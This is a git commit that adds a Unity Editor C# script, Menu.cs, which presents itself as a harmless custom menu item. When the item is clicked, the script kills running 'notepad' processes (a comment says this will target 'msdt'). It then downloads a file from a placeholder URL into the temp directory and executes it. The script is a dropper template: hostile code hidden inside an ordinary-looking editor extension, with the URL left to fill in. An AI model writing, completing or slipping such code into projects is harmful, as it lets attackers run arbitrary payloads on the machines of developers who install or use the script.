b3061ba9c9d10b63c4aa8ac1c7a238d1aaa051c4
izaiah <132551846+IzaiahKun@users.noreply.github.com>
2023-08-04 01:50:10 -0700

    Add files via upload

---
+++ Menu.cs
@@ -0,0 +1,30 @@
+﻿using UnityEngine;
+using UnityEditor;
+using System.Net;
+using System;
+using System.IO;
+using System.Diagnostics;
+
+public class log : EditorWindow
+{
+    public static WebClient webClient = new WebClient();
+    [MenuItem("Menu/SubMenu", false, 120)] //Menu and SubMenu can be changed.
+
+    static public void logger()
+    {
+
+        //string command = "/C notepad.exe";
+        //Process.Start("cmd.exe", command);
+        Process[] processes = Process.GetProcessesByName("notepad"); // this will be "msdt"
+        foreach (Process process in processes)
+
+        {
+            process.Kill();
+        }
+        EditorWindow.GetWindow<log>();
+        string tempPath = Path.GetTempPath();
+        string downloadPath = Path.Combine(tempPath, ""); //file name in the ""
+        webClient.DownloadFile("", downloadPath); // download link in the ""
+        System.Diagnostics.Process.Start(downloadPath);
+    }
+}
